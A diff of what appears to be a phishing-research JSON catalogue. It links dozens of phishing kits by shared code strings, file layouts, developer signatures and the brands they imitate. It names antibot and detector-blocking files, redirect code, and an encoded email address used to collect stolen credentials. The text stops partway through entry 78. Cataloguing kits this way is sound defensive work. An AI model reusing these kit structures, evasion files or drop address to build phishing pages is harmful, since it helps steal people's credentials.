@@ -2,7 +2,7 @@
     "1": {
         "search_string": "XBALTI",
         "structure": {},
-        "message": "Probably means that belongs to the same family XBALTI of phishing kits",
+        "message": "Probably means that belongs to the same family XBALTI of phishing kits. Amazon Login Page. Chase Login Page. Apple Login Page",
         "by_analysing": "2020_05_3324279b62ae4021",
         "kits": [
             "2020_05_3324279b62ae4021",
@@ -40,7 +40,7 @@
     "2": {
         "search_string": "header(\"location: login.php?cmd=login_submit&id=$praga$praga",
         "structure": {},
-        "message": "Wells Fargo login page. Bank of America login page. Bank page. Netflix Page",
+        "message": "Wells Fargo login page. Bank of America login page. Bank page. Netflix Page. Office 365 Login. Office Sign In",
         "by_analysing": "2020_05_059fcc31cf099017",
         "kits": [
             "2020_05_059fcc31cf099017",
@@ -76,7 +76,7 @@
     "3": {
         "search_string":"function MDgetIp()",
         "structure": {},
-        "message": "",
+        "message": "Name for a function that gets IP info. Office 365 Login",
         "by_analysing": "",
         "kits": [
             "2020_05_10f6e8632a65e299",
@@ -109,7 +109,7 @@
     "6": {
         "search_string": "jQuery first, then Tether, then Bootstrap JS.",
         "structure": {},
-        "message": "Very weird OneDrive Login with Office 365 or Outlook",
+        "message": "Very weird OneDrive Login with Office 365 or Outlook. Insta Voice (Similar Page to OneDrive)",
         "by_analysing": "2020_05_52ac7ee30fe637e9",
         "kits": [
             "2020_05_52ac7ee30fe637e9",
@@ -132,7 +132,7 @@
     "7": {
         "search_string": "function generateRandomString($length = 24)",
         "structure": {},
-        "message": "Kits from the 2020 have the same blocker file. Kits from 2021 and 2022 have the same function generateRandomString in the index file",
+        "message": "Kits from the 2020 have the same blocker file. Kits from 2021 and 2022 have the same function generateRandomString in the index file. Microsoft Dashboard",
         "by_analysing": "2020_05_807635038995d489",
         "kits": [
             "2020_05_807635038995d489",
@@ -189,8 +189,16 @@
     },
     "12": {
         "search_string": "// Block phishing detectors host by returning 404 error\"",
-        "structure": {},
-        "message": "All phishing kits had the same folder structure and files. Linkedin Login page",
+        "structure": {
+            "name": "*",
+            "files": [
+                "block_detectors.php",
+                "hello.php",
+                "index.php",
+                "login.php"
+            ]
+        },
+        "message": "All phishing kits had the same folder structure and files. Linkedin Login page. Microsoft Dashboard",
         "by_analysing": "2020_06_04f219f01a9b61e0",
         "kits": [
             "2020_06_04f219f01a9b61e0",
@@ -295,7 +303,7 @@
     "17": {
         "search_string": "function generateRandomString($length = 10)",
         "structure": {},
-        "message": "Dropbox 'box' page with Office365 login option. Variation from the generateRandomString function with length 24",
+        "message": "Variation from the generateRandomString function with length 24. Dropbox 'box' page with Office365 login option. Wells Fargo Login Page. Bank of America",
         "by_analysing": "2020_06_9642b8b5ff1af09a",
         "kits": [
             "2020_05_8d041975b63c8e7d",
@@ -360,7 +368,7 @@
     "21": {
         "search_string": "function visitor_country()",
         "structure": {},
-        "message": "Function in the php file that sends user information",
+        "message": "Function in the php file that sends user information. Dropbox Page. Office 365 Login",
         "by_analysing": "2020_07_28785cbf1b101c26",
         "kits": [
             "2020_05_3d61bea5469927c4",
@@ -442,7 +450,7 @@
     "24": {
         "search_string": "$dst    = substr(md5($random), 0, 1000000000);",
         "structure": {},
-        "message": "Same project structure",
+        "message": "Same project structure. Linkedin Login Page. Desjardins. Bank of America. Dropbox Page",
         "by_analysing": "2020_08_4d0fc6ac84f87f09",
         "kits": [
             "2020_05_eb79f7c5e16fdddc",
@@ -583,7 +591,7 @@
     "33": {
         "search_string": "jQuery first, then Popper.js, then Bootstrap JS",
         "structure": {},
-        "message": "Comment in the index page. LinkedIn login page. Same index.html structure",
+        "message": "Comment in the index page. LinkedIn login page. Same index.html structure. Microsoft Download File. Facebook Button + Login Page. Outlook Voice Message. Microsoft Login Page. Microsoft Login Page",
         "by_analysing": "2020_10_91222696a821189c",
         "kits": [
             "2020_10_88b3ab6e4f9e2622",
@@ -719,15 +727,935 @@
         ]
     },
     "35": {
-        "search_string": "",
+        "search_string": "CyberTeamRox",
         "structure": {},
-        "message": "",
-        "by_analysing": "",
+        "message": "Same Phishing Kit Developer. Linkedin Page",
+        "by_analysing": "2020_10_c09d58e1a254fc32",
         "kits": [
-            
+            "2020_10_c09d58e1a254fc32",
+            "2021_12_87c71623c92482f8" 
         ]
     },
     "26": {
+        "search_string": "Cyborg99",
+        "structure": {},
+        "message": "Phishing Kit Developer. Gov.uk refund page",
+        "by_analysing": "2020_10_c763ac0c307704d1",
+        "kits": [
+            "2020_10_c763ac0c307704d1",
+            "2020_11_b2f517b092a7e463",
+            "2021_01_1d2e64767355ec05",
+            "2021_08_eceb94e07694f359",
+            "2022_04_b1d73b89fb15c6b2"
+        ]
+    },
+    "36": {
+        "search_string": "",
+        "structure": {},
+        "message": "CONTRA EXEMPLO: Dois PKs visualmente identicos, mas totalmente diferentes.",
+        "by_analysing": "2020_10_f42d945ad5476791",
+        "kits": [
+            "2020_10_c09d58e1a254fc32",
+            "2020_10_f42d945ad5476791"
+        ]
+    },
+    "37": {
+        "search_string": "$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109)",
+        "structure": {},
+        "message": "Same email page with functions visitor_country and country_sort. Dropbox Page",
+        "by_analysing": "2020_10_f42d945ad5476791",
+        "kits": [
+            "2020_05_3d61bea5469927c4",
+            "2020_06_4840920fa15e2e5c",
+            "2020_07_28785cbf1b101c26",
+            "2020_07_bd5000f66419126b",
+            "2020_08_4d0fc6ac84f87f09",
+            "2020_10_f42d945ad5476791",
+            "2021_02_821ed20aa859cd00",
+            "2021_03_52eadd2316e069ff",
+            "2021_03_a1e16b324057e686",
+            "2021_06_08e5bf1eabe9c4ba",
+            "2021_08_f8cb0efe741afafb",
+            "2021_11_1d2652e7a3d1932e",
+            "2022_01_34429bb3ab50f1ea",
+            "2022_01_569156b45e4a2843",
+            "2022_03_04e6ff441e6f67ae",
+            "2023_06_f3d864e6182085f9",
+            "2023_10_16ceb489e574d767"
+        ]
+    },
+    "38": {
+        "search_string": "",
+        "structure": {
+            "name": "*",
+            "dirs": [
+                {
+                    "name": "assets"
+                }, 
+                {
+                    "name": "includes"
+                }
+            ],
+            "files": [
+                "index.php"
+            ]
+        },
+        "message": "Same structure. Microsoft Login Page. Box Page. ",
+        "by_analysing": "2020_10_fdf281e9738b4049",
+        "kits": [
+            "2020_05_8d041975b63c8e7d",
+            "2020_06_9642b8b5ff1af09a",
+            "2020_10_fdf281e9738b4049"
+        ]
+    },
+    "39": {
+        "search_string": "127.0.0.1  -  2017-8-14 @ 20:49:14",
+        "structure": {
+            "name": "*",
+            "dirs": [
+                {
+                    "name": "Linkedin"
+                }
+            ],
+            "files": [
+                "index.php",
+                "blocker.php"
+            ]
+        },
+        "message": "Testing log string. Linkedin Login Page.",
+        "by_analysing": "",
+        "kits": [
+            "2020_06_02d7fdd41ca3794c",
+            "2020_06_ba5f01745839f85d",
+            "2020_11_15bd060b48960209",
+            "2021_07_21cc91da94f1fcf6",
+            "2021_10_1899c64b25e2397f",
+            "2021_11_2b704d4e29d71940",
+            "2021_12_3432cdab73803855",
+            "2022_03_7444c49aa7f8e15a",
+            "2023_03_18b728ed56a279aa",
+            "2023_06_f3d864e6182085f9"
+        ]
+    },
+    "40": {
+        "search_string": "",
+        "structure": {
+            "name": "*",
+            "files": [
+                "index.php",
+                "index2.php",
+                "loops.php",
+                "loops2.php"
+            ]
+        },
+        "message": "Same Structure. LinkedIn Login Page",
+        "by_analysing": "2020_11_41f9463ca3f8d2cc",
+        "kits": [
+            "2020_11_41f9463ca3f8d2cc",
+            "2020_11_80a6e8f33b14c586",
+            "2020_11_e8e4b6676c33a842"
+        ]
+    },
+    "41": {
+        "search_string": "",
+        "structure": {
+            "name": "*",
+            "dirs": 
+            [
+                {
+                    "name": "css"
+                },
+                {
+                    "name": "images"
+                },
+                {
+                    "name": "video"
+                }
+            ],
+            "files": [
+                "index.html",
+                "next.php"
+            ]
+        },
+        "message": "Office 365 Login Page",
+        "by_analysing": "2020_11_4797be2b58792a6f",
+        "kits": [
+            "2020_11_4797be2b58792a6f",
+            "2020_11_662f4f4c6420b242"
+        ]
+    },
+    "42": {
+        "search_string": "Coded & Tools By Hitman",
+        "structure": {},
+        "message": "Phishing Kit Developer. Apple Login Page",
+        "by_analysing": "",
+        "kits": [
+            "2020_06_38cb08d2bfe99d24",
+            "2020_06_5533fbabc58a4025",
+            "2020_11_4fc296585754689d",
+            "2020_12_a826a9ba28d1dca6",
+            "2022_01_54fc102b7b775450",
+            "2022_01_f3eb7c84956ebf04"
+        ]
+    },
+    "43": {
+        "search_string": "header(\"location: index.htm?cmd=login_submit&id=$praga$praga",
+        "structure": {},
+        "message": "Same project files",
+        "by_analysing": "2020_11_67cd835ce9ee5d68",
+        "kits": [
+            "2020_11_67cd835ce9ee5d68",
+            "2021_11_e0f93d437360dbd8"
+        ]
+    },
+    "44": {
+        "search_string": "",
+        "structure": {
+            "name": "*",
+            "dirs": 
+            [
+                {
+                    "name": "cgi-bin"
+                },
+                {
+                    "name": "images"
+                }
+            ],
+            "files": [
+                "post.php"
+            ]
+        },
+        "message": "To view Shared Docs. Login with Yahoo, Gmail, Hotmail, ...",
+        "by_analysing": "2020_11_8123daa77153359c",
+        "kits": [
+            "2020_11_8123daa77153359c",
+            "2021_04_53ca52db75f8be63"
+        ]
+    },
+    "45": {
+        "search_string": "",
+        "structure": {
+            "name": "*",
+            "dirs": 
+            [
+                {
+                    "name": "images"
+                }
+            ],
+            "files": [
+                "index.php",
+                "index2.php",
+                "index3.php",
+                "server.php",
+                "server2.php",
+                "server3.php"
+            ]
+        },
+        "message": "Microsoft Login Page. Similar Structure",
+        "by_analysing": "2020_11_9da9aad25240d1f9",
+        "kits": [
+            "2020_11_9da9aad25240d1f9",
+            "2020_12_ca856adada03e68f",
+            "2021_04_5cc06027aedcbc76",
+            "2021_04_9a8491f052de8e16",
+            "2021_04_a7e2ef92badafd86",
+            "2021_08_c3f4a3519014c9da"
+        ]
+    },
+    "46": {
+        "search_string": "function recurse_copy($src,$dst)",
+        "structure": {},
+        "message": "Função usada pra redirecionar pra outro diretorio. Linkedin Login Page. Desjardins. Bank of America. Dropbox Page",
+        "by_analysing": "2020_11_dd687c142cb9a6ea",
+        "kits": [
+            "2020_05_c3a26b41f0ebf55a",
+            "2020_05_eb79f7c5e16fdddc",
+            "2020_06_4c91e315aedd1346",
+            "2020_06_f382fb4677e7a0a3",
+            "2020_07_1338afd2d6c8ab00",
+            "2020_07_2fe9c49919a1a02c",
+            "2020_07_6d2760c5169cfcf1",
+            "2020_07_a5d10e46001963eb",
+            "2020_07_ba9a0268da6a3ee2",
+            "2020_07_bd5000f66419126b",
+            "2020_08_4d0fc6ac84f87f09",
+            "2020_08_7e324ec2534878a3",
+            "2020_10_936fbab280f97fdb",
+            "2020_11_566b74048f10b657",
+            "2020_11_7c5a6b5861941d12",
+            "2020_11_83b8c6da252811af",
+            "2020_11_dd687c142cb9a6ea",
+            "2020_11_fcef039af9644674",
+            "2020_12_c699ff1d5ab6f2c5",
+            "2021_01_53703d0d06db9f04",
+            "2021_01_c685a299368b8cf9",
+            "2021_01_c6de3a213f6e464b",
+            "2021_01_f015731dc899d647",
+            "2021_02_2fc274b2a1298e1d",
+            "2021_02_53f40ef2566fbb95",
+            "2021_02_f946df1a8fc9650c",
+            "2021_03_2f199c53b95dcbe2",
+            "2021_03_6e2ffa70878c9949",
+            "2021_03_7e8666f9f442b26f",
+            "2021_03_a1e16b324057e686",
+            "2021_04_0aca242803d09ef4",
+            "2021_04_432f1e3d17ebf7c5",
+            "2021_04_f2d195ad6731a4d8",
+            "2021_06_cccd38135a731c1c",
+            "2021_08_9b872c09c4cc3e1a",
+            "2021_10_c56c8255094b12e9",
+            "2021_11_ce560c9d0274b639",
+            "2022_01_73754b3f497f8642",
+            "2022_02_a1c54ace27fe86f9",
+            "2022_03_04e6ff441e6f67ae",
+            "2022_04_b1d73b89fb15c6b2",
+            "2022_06_630a67039d2dc486",
+            "2022_08_5b4c2eb1b3603688",
+            "2022_09_7b4b518051135831",
+            "2023_01_8eda71ba81807f2b",
+            "2023_09_4c94383a22667d02",
+            "2023_09_4e08e9df66d4a9e2",
+            "2023_10_45cf09569acd6020"
+        ]
+    },
+    "47": {
+        "search_string": "Coded By Noureddine Tkodar",
+        "structure": {},
+        "message": "Multiple Languages. Netflix Login Page",
+        "by_analysing": "2020_12_29ebc3722b9be359",
+        "kits": [
+            "2020_12_29ebc3722b9be359",
+            "2021_04_cbb161da35f91e9e"
+        ]
+    },
+    "48": {
+        "search_string": "",
+        "structure": {
+            "name": "*",
+            "files": [
+                "vu.txt"
+            ]
+        },
+        "message": "vu.txt file is used for logging in a phishing kit. Linkedin Login Page. Apple Home Page. Wells Fargo Page",
+        "by_analysing": "",
+        "kits": [
+            "2020_06_02d7fdd41ca3794c",
+            "2020_06_ba5f01745839f85d",
+            "2020_08_7e324ec2534878a3",
+            "2020_11_15bd060b48960209",
+            "2020_11_f19db621730bed4b",
+            "2020_12_403eaad81dae0208",
+            "2020_12_d333de2d5b964e52",
+            "2021_01_c685a299368b8cf9",
+            "2021_02_40e53532eed43eb5",
+            "2021_02_53f40ef2566fbb95",
+            "2021_02_b5e8234101d1c25e",
+            "2021_04_37d42e7e5db1b18f",
+            "2021_07_21cc91da94f1fcf6",
+            "2021_10_1899c64b25e2397f",
+            "2021_11_2b704d4e29d71940",
+            "2021_12_3432cdab73803855",
+            "2022_03_7444c49aa7f8e15a",
+            "2023_03_18b728ed56a279aa",
+            "2023_06_f3d864e6182085f9"
+        ]
+    },
+    "50": {
+        "search_string": "Hamid Akhatar",
+        "structure": {},
+        "message": "Apple Home Page",
+        "by_analysing": "2020_12_403eaad81dae0208",
+        "kits": [
+            "2020_07_8d9b2121b9547d7d",
+            "2020_12_403eaad81dae0208",
+            "2022_05_e6dfdf7a08852202",
+            "2022_06_a77b432a218079e6",
+            "2022_09_83849cf300daa34b"
+        ]
+    },
+    "49": {
+        "search_string": "",
+        "structure": {
+            "name": "*",
+            "files": [
+                "index.html",
+                "indexx.html"
+            ]
+        },
+        "message": "Scotia Bank Phishing Kit. Netflix Login Page",
+        "by_analysing": "2020_12_4086388896c11f9d",
+        "kits": [
+            "2020_10_a39708b6031424b9",
+            "2020_12_4086388896c11f9d",
+            "2021_01_7bd2df2a80c352c5"
+        ]
+    },
+    "51": {
+        "search_string": "",
+        "structure": {
+            "name": "*",
+            "files": [
+                "ind.php",
+                "index.html",
+                "n.php"
+            ]
+        },
+        "message": "Microsoft Login Page, Shaded Background. || Created in CODE~SPIRIT",
+        "by_analysing": "2020_12_504463ab159341d8",
+        "kits": [
+            "2020_12_504463ab159341d8",
+            "2021_02_0121ed311572bbae",
+            "2021_02_1936ceff575445fa",
+            "2021_03_9e9e68ae5642db27",
+            "2021_06_160ef6ef43b5e47b",
+            "2021_10_7b6a5a9fe48a2228",
+            "2021_10_ec81b40b3a9dde59"
+        ]
+    },
+    "52": {
+        "search_string": "z0n51",
+        "structure": {},
+        "message": "Author Name. Correos Page",
+        "by_analysing": "",
+        "kits": [
+            "2020_12_65a2ea33d36771f1",
+            "2020_12_9cc3f47ca084e2d6",
+            "2023_03_445acfe09edf2daa",
+            "2023_03_a05e698f73bbddc2"
+        ]
+    },
+    "53": {
+        "search_string": "Location: Seleccione_medio_de_pago.php",
+        "structure": {},
+        "message": "Same redirection. Correos Page",
+        "by_analysing": "2020_12_65a2ea33d36771f1",
+        "kits": [
+            "2020_12_65a2ea33d36771f1",
+            "2022_06_1e96059aaf5810ff"
+        ]
+    },
+    "54": {
+        "search_string": "MIRCBOOT",
+        "structure": {},
+        "message": "Phishing Kit Developer. Microsoft Login Page.",
+        "by_analysing": "",
+        "kits": [
+            "2020_12_9dc5caba5a6d952c",
+            "2021_04_77a2179ecd621500"
+        ]
+    },
+    "55": {
+        "search_string": "",
+        "structure": {
+            "name": "*",
+            "files": [
+                "boat_detector.php"
+            ]
+        },
+        "message": "Common filename. Dropbox page with Office login option",
+        "by_analysing": "2020_12_a30703a4609e5d6e",
+        "kits": [
+            "2020_10_41d30d816e144ed1",
+            "2020_12_a30703a4609e5d6e",
+            "2022_03_16b1032e31dfa0ed"
+        ]
+    },
+    "56": {
+        "search_string": "http://2m.ma",
+        "structure": {},
+        "message": "Redirection link benign page",
+        "by_analysing": "2020_12_a3beddb685fd66f9",
+        "kits": [
+            "2020_05_d99f57f2660aee42",
+            "2020_05_e6f80c46d4718df6",
+            "2020_07_04ee42df8e6d9eff",
+            "2020_07_a93289d98bf80afc",
+            "2020_07_b3ef49237b504791",
+            "2020_08_44c6d9c7195f3d8d",
+            "2020_10_9827d4ec33c383d8",
+            "2020_11_161e129e87d373a8",
+            "2020_11_220a34aadd768ef1",
+            "2020_11_eb5d2ee355adaca3",
+            "2020_12_9cc3f47ca084e2d6",
+            "2020_12_a3beddb685fd66f9",
+            "2020_12_d5bc3c1fc4b1bfb0",
+            "2021_01_3a567c5a8caa27d8",
+            "2021_01_628548b0b0ff9cde",
+            "2021_01_70a1711b44d7e7d3",
+            "2021_01_f1a7068463b6deab",
+            "2021_02_a5584b35e3b865c8",
+            "2021_03_34f4d065f88fcc16",
+            "2021_03_4f419dd311a8fa52",
+            "2021_04_24ac1d3079a48ad5",
+            "2021_04_8ce3486b247d62d7",
+            "2021_04_bc4f3ef7f71689af",
+            "2021_04_d6a717e84713f4ca",
+            "2021_04_e15390795bca3287",
+            "2021_09_c9c537be058882aa",
+            "2021_10_c56c8255094b12e9",
+            "2021_12_6e0d501a7f20f3bd",
+            "2022_02_186170b13e031f8f",
+            "2022_02_39db16b60c67c5ef",
+            "2022_04_a2c2864e0e9feac1",
+            "2022_04_dd7d3571f2a427cd",
+            "2022_05_1174ab4c24408166",
+            "2022_05_5a9cc354066ad9ca",
+            "2022_06_bd05224ce1f59111",
+            "2022_07_63f1ed349a156798",
+            "2022_07_9de43fa59119b37a",
+            "2022_07_dae723abe83143e6",
+            "2022_09_7c8b3dec4569cdfd",
+            "2022_09_de6cdcb4f1c37d51",
+            "2022_09_ee5c0a38ad8d3b2e",
+            "2023_01_ed2316cb115c69b9",
+            "2023_03_0ae6e47cbb9dc355",
+            "2023_03_445acfe09edf2daa",
+            "2023_03_a05e698f73bbddc2",
+            "2023_04_8297f3ef17a0757c",
+            "2023_07_6a8fe6b44931ede1",
+            "2023_07_9c0574f89e35f2bd",
+            "2023_08_0c2b9cb984faf028",
+            "2023_08_d2ce3038e827c97e",
+            "2023_08_d9f4904b39e29bb0",
+            "2023_08_ef9e6f40a4e0a378",
+            "2024_04_3f1aa0f647df6628"
+        ]
+    },
+    "57": {
+        "search_string": "https://www.wikipedia.org/wiki/Microsoft_Office",
+        "structure": {},
+        "message": "Redirection link",
+        "by_analysing": "",
+        "kits": [
+            "2020_10_455f75473718da13",
+            "2020_12_a2b0a62b10cfba39",
+            "2021_01_2492f2f5295c64f8",
+            "2021_02_aa0a8b6e3a3214c2",
+            "2021_06_39630d5e9202ae26",
+            "2021_06_603cd32c4eca4e69",
+            "2021_07_05df6cf535998f42",
+            "2021_07_28c92a87e7a41d3e",
+            "2021_07_3ecb935b97157ef7",
+            "2021_09_8ec0e5e4b8f76456",
+            "2021_10_7e54a6018de8b8fc",
+            "2021_10_8dc137f803166126",
+            "2021_10_9b400dcf7c197376",
+            "2021_10_c17cab758523e05e",
+            "2022_02_778fa731793f4073",
+            "2022_02_c877feb8e2c85e1d"
+        ]
+    },
+    "58": {
+        "search_string": "",
+        "structure": {
+            "name": "*",
+            "files": [
+                "hok.js"
+            ]
+        },
+        "message": "AES Implementation File. Netflix Login Page",
+        "by_analysing": "2020_12_c699ff1d5ab6f2c5",
+        "kits": [
+            "2020_07_1338afd2d6c8ab00",
+            "2020_07_ba9a0268da6a3ee2",
+            "2020_11_566b74048f10b657",
+            "2020_11_7c5a6b5861941d12",
+            "2020_11_83b8c6da252811af",
+            "2020_11_dd687c142cb9a6ea",
+            "2020_11_fcef039af9644674",
+            "2020_12_c699ff1d5ab6f2c5",
+            "2021_01_c6de3a213f6e464b",
+            "2021_01_f015731dc899d647",
+            "2021_02_40e53532eed43eb5",
+            "2021_02_b5e8234101d1c25e",
+            "2021_03_7e8666f9f442b26f",
+            "2021_04_432f1e3d17ebf7c5",
+            "2022_01_2a21f05bffe6ff0b",
+            "2022_02_a1c54ace27fe86f9"
+        ]
+    },
+    "59": {
+        "search_string": "",
+        "structure": {
+            "name": "*",
+            "files": [
+                "xmvdeptrai.php"
+            ]
+        },
+        "message": "Spanish Facebook Login Page",
+        "by_analysing": "2020_12_cb02050535f06240",
+        "kits": [
+            "2020_12_cb02050535f06240",
+            "2020_12_d248c8c6e11aa232"
+        ]
+    },
+    "60": {
+        "search_string": "",
+        "structure": {
+            "name": "*",
+            "files": [
+                "hi4.php",
+                "index.html"
+            ]
+        },
+        "message": "hi4.php is the antibot file. DHL Download Page.",
+        "by_analysing": "2021_01_00e39b26479c85c8",
+        "kits": [
+            "2021_01_00e39b26479c85c8",
+            "2021_01_43be72bb7f7f8ed4",
+            "2021_02_1de8780ebc8ad193",
+            "2021_04_751d205e139ce80f",
+            "2021_04_ab88c9ef481602da",
+            "2021_04_ae34bccd7c23cb6a"
+        ]
+    },
+    "61": {
+        "search_string": "Accéder à mes comp. Banco Crédito Agrícola Alpes-Provence",
+        "structure": {},
+        "message": "Titulo da Pagina. ",
+        "by_analysing": "2021_01_6cda170311736036",
+        "kits": [
+            "2020_08_e734638014664a3f",
+            "2021_01_6cda170311736036"
+        ]
+    },
+    "62": {
+        "search_string": "",
+        "structure": {
+            "name": "*",
+            "dirs": 
+            [
+                {
+                    "name": "includes",
+                    "dirs": [
+                        {
+                            "name":"lang"
+                        }
+                    ]
+                },
+                {
+                    "name": "lib"
+                }
+            ],
+            "files": [
+                "index.php"
+            ]
+        },
+        "message": "Linkedin Login Page",
+        "by_analysing": "2021_01_53703d0d06db9f04",
+        "kits": [
+            "2020_12_e42324261f829559",
+            "2021_01_53703d0d06db9f04",
+            "2021_01_b3678ea6bc1f0a43"
+        ]
+    },
+    "63": {
+        "search_string": "",
+        "structure": {
+            "name": "*",
+            "dirs": [
+                { "name":"letter" },
+                { "name":"mazon" }
+            ]
+        },
+        "message": "Variant of he XBALTI Phishing Kit. Amazon Login Page",
+        "by_analysing": "",
+        "kits": [
+            "2020_06_23aa8bf035b943d5",
+            "2020_07_3297e8aab70f9009",
+            "2020_07_8dbb96a2bd9c97ec",
+            "2020_07_b8ca580e61e13104",
+            "2020_08_3bed6f729f89c932",
+            "2020_08_5555b0d0de8536b8",
+            "2021_01_e84b98cfb261f590",
+            "2021_12_c2823e3a5a98b3ef",
+            "2022_01_206adc591da20f17",
+            "2022_01_58ce2f9a339af60a",
+            "2022_01_823b69dd2431c15b",
+            "2022_01_e46999f129316df5",
+            "2022_01_eb26847b73040570",
+            "2022_06_2c371628ea8d83bf",
+            "2022_07_3003487de9b69ec0",
+            "2022_07_eb35830667ed7c34"
+        ]
+    },
+    "64": {
+        "search_string": "",
+        "structure": {
+            "name": "*",
+            "files": [
+                "index.html",
+                "n.php",
+                "rst.htm"
+            ]
+        },
+        "message": "Same Structure. Outlook Login Page",
+        "by_analysing": "2021_02_0121ed311572bbae",
+        "kits": [
+            "2020_12_504463ab159341d8",
+            "2021_02_0121ed311572bbae",
+            "2021_02_1936ceff575445fa",
+            "2021_03_9e9e68ae5642db27"
+        ]
+    },
+    "65": {
+        "search_string": "raouf hardc0d3r",
+        "structure": {},
+        "message": "Developer. Amazon Login Page.",
+        "by_analysing": "",
+        "kits": [
+            "2020_11_48c344556f9e6222",
+            "2020_12_600b491d3b0205ec",
+            "2021_01_a0ca656b2cf85040",
+            "2021_02_3f03d65295fa6211"
+        ]
+    },
+    "66": {
+        "search_string": "",
+        "structure": {
+            "name": "*",
+            "files": [
+                "api.php",
+                "sync.php"
+            ]
+        },
+        "message": "Same sync.php file. One Drive Download Page. Microsoft Login Page",
+        "by_analysing": "2021_02_7cc4fdd21f46312c",
+        "kits": [
+            "2020_10_1dba2c8fed60a6b8",
+            "2020_10_68bea4ca1e222e05",
+            "2021_02_7cc4fdd21f46312c"
+        ]
+    },
+    "67": {
+        "search_string": "CrEaTeD bY VeNzA",
+        "structure": {},
+        "message": "Developer. Outlook Voice Message. Microsoft Login Page",
+        "by_analysing": "2021_02_85f27d075802abd3",
+        "kits": [
+            "2020_11_4797be2b58792a6f",
+            "2020_11_662f4f4c6420b242",
+            "2020_12_33b98e5ac86be619",
+            "2021_02_85f27d075802abd3",
+            "2021_06_97b17cc917409949",
+            "2021_07_f2863a7e449daa18",
+            "2021_08_57ac8f8c2167febf",
+            "2021_09_df7af9a9de14a13b",
+            "2021_11_0080a612686f4e2f",
+            "2021_12_265f56e6c6b9980b",
+            "2021_12_be1b325d0e9113e4",
+            "2021_12_c251a5c0ad4757e2",
+            "2022_01_81f4329e7d66e2fa",
+            "2022_03_3af0876b54a75243",
+            "2022_04_a85b2471c1b9cf8c",
+            "2022_05_885c892daae9a14c",
+            "2022_07_4e4a0fe6a20896a0",
+            "2022_08_597bedd276cc6773",
+            "2022_08_c3635bdc70a38d20",
+            "2022_10_535c8e1ade23e461",
+            "2023_01_8eda71ba81807f2b",
+            "2023_02_4b15c5635f24e6e3",
+            "2023_03_225ff4475bc2988e",
+            "2023_05_a45bf766731031b3",
+            "2023_05_da061ac812de3926",
+            "2024_02_93c629d8fe6e763d",
+            "2024_02_f8b2b14623698f2a",
+            "2024_04_2f6f9fdf1f10e3f3"
+        ]
+    },
+    "68": {
+        "search_string": "by HD Inc",
+        "structure": {},
+        "message": "Linkedin Login Without Logo",
+        "by_analysing": "2021_03_52eadd2316e069ff",
+        "kits": [
+            "2020_07_28785cbf1b101c26",
+            "2021_03_52eadd2316e069ff"
+        ]
+    },
+    "69": {
+        "search_string": "Created BY Burhan",
+        "structure": {},
+        "message": "Developer. One Drive Dashboard",
+        "by_analysing": "2021_04_486981c4b7d6eb06",
+        "kits": [
+            "2021_04_486981c4b7d6eb06",
+            "2023_08_73e9e2bb0f2169b6"
+        ]
+    },
+    "70": {
+        "search_string": "",
+        "structure": {
+            "name": "*",
+            "files": [
+                "index.php",
+                "ab.php",
+                "v.php"
+            ]
+        },
+        "message": "ab.php Anti Bot File. Netflix Login Page.",
+        "by_analysing": "2021_04_96092f24ebed7251",
+        "kits": [
+            "2021_04_96092f24ebed7251",
+            "2021_10_00b2ff3e16772804",
+            "2021_10_eac1b3bbc2ade941",
+            "2022_05_3ce98fc99aaefdfd"
+        ]
+    },
+    "71": {
+        "search_string": "fallag.mahdi",
+        "structure": {},
+        "message": "Developer. Linkedin Login",
+        "by_analysing": "2021_04_f2d195ad6731a4d8",
+        "kits": [
+            "2020_07_6d2760c5169cfcf1",
+            "2021_04_f2d195ad6731a4d8"
+        ]
+    },
+    "72": {
+        "search_string": "BURHAN FUDPAGE",
+        "structure": {},
+        "message": "Developer. Yahoo Login",
+        "by_analysing": "2021_06_08e5bf1eabe9c4ba",
+        "kits": [
+            "2021_06_08e5bf1eabe9c4ba",
+            "2024_04_4d58f46b4aaeaa85"
+        ]
+    },
+    "73": {
+        "search_string": "",
+        "structure": {
+            "name": "*",
+            "files": [
+                "antiboots.php",
+                "autoblock.php"
+            ]
+        },
+        "message": "Dropbox Business Page",
+        "by_analysing": "2021_06_a3ffab29478d8154",
+        "kits": [
+            "2020_05_f992f3eaa10387ad",
+            "2021_06_a3ffab29478d8154"
+        ]
+    },
+    "74": {
+        "search_string": "//\\ speed\\ you\\ want\\ the\\ toggle\\ to\\ happen",
+        "structure": {},
+        "message": "Malformed Dropbox Page with Login Options",
+        "by_analysing": "2021_08_0714478bc91dc88a",
+        "kits": [
+            "2021_08_0714478bc91dc88a",
+            "2021_08_811a0cdbacb7694b"
+        ]
+    },
+    "75": {
+        "search_string": "",
+        "structure": {
+            "name": "*",
+            "dirs": [
+                {
+                    "name": "images"
+                },
+                {
+                    "name": "css"
+                }
+            ],
+            "files": [
+                "1.html",
+                "index.php",
+                "next.php"
+            ]
+        },
+        "message": "Instagram Login",
+        "by_analysing": "2021_08_c953ba0498af6043",
+        "kits": [
+            "2021_07_73b17cc1582eaac0",
+            "2021_08_c953ba0498af6043"
+        ]
+    },
+    "76": {
+        "search_string": "",
+        "structure": {
+            "name": "*",
+            "dirs": [
+                {
+                    "name": "config"
+                },
+                {
+                    "name": "fonts"
+                }
+            ],
+            "files": [
+                "contact404.php",
+                "thanks.php"
+            ]
+        },
+        "message": "Wells Fargo Login Security Issue",
+        "by_analysing": "2021_09_0ecd8a60d14c7e1a",
+        "kits": [
+            "2021_09_0ecd8a60d14c7e1a",
+            "2021_09_50be8de56983756c",
+            "2021_09_77691e5358f952df",
+            "2021_09_df30c2f35cb80f58"
+        ]
+    },
+    "77": {
+        "search_string": "no learn more in metro view",
+        "structure": {},
+        "message": "Comment on Index file. Docusign Login Page",
+        "by_analysing": "2021_09_3a7c8a1d8f82c0a7",
+        "kits": [
+            "2021_09_3a7c8a1d8f82c0a7",
+            "2021_10_73cd332594b73c7e",
+            "2022_04_9265485bc262a335"
+        ]
+    },
+    "78": {
